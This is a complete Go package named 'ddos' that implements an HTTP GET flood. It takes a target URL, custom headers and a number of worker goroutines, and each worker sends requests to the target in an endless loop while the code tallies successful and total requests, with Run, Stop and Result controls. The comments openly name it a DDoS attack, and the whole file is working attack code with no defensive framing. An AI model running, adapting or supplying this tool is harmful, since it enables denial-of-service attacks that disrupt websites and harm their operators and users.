package ddos

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"runtime"
	"sync/atomic"
)

// DDoS - structure of value for DDoS attack
type DDoS struct {
	url           string
	request       *http.Request
	stop          *chan bool
	amountWorkers int

	// Statistic
	successRequest int64
	amountRequests int64
}

// New - initialization of new DDoS attack
func New(URL string, workers int, headers map[string]string) (*DDoS, error) {
    if workers < 1 {
        return nil, fmt.Errorf("Amount of workers cannot be less 1")
    }
    u, err := url.Parse(URL)
    if err != nil || len(u.Host) == 0 {
        return nil, fmt.Errorf("Undefined host or error = %v", err)
    }
    // add headers
    req, err := http.NewRequest("GET", URL, nil)
    if err != nil {
        return nil, fmt.Errorf("Build request failed = %v", err)
    }
    for k, v := range headers {
        req.Header.Add(k, v)
    }
    
    s := make(chan bool)
    return &DDoS{
        url:           URL,
        request:       req,
        stop:          &s,
        amountWorkers: workers,
    }, nil
}

// Run - run DDoS attack
func (d *DDoS) Run() {
    for i := 0; i < d.amountWorkers; i++ {
        go func() {
            for {
                select {
                case <-(*d.stop):
                    return
                default:
                    // sent http GET requests
                    client := &http.Client{}
                    resp, err := client.Do(d.request) //提交
                    atomic.AddInt64(&d.amountRequests, 1)
                    if err == nil {
                        atomic.AddInt64(&d.successRequest, 1)
                        _, _ = io.Copy(ioutil.Discard, resp.Body)
                        resp.Body.Close()
                    }
                }
                runtime.Gosched()
            }
        }()
    }
}

// Stop - stop DDoS attack
func (d *DDoS) Stop() {
	for i := 0; i < d.amountWorkers; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

// Result - result of DDoS attack
func (d DDoS) Result() (successRequest, amountRequests int64) {
	return d.successRequest, d.amountRequests
}
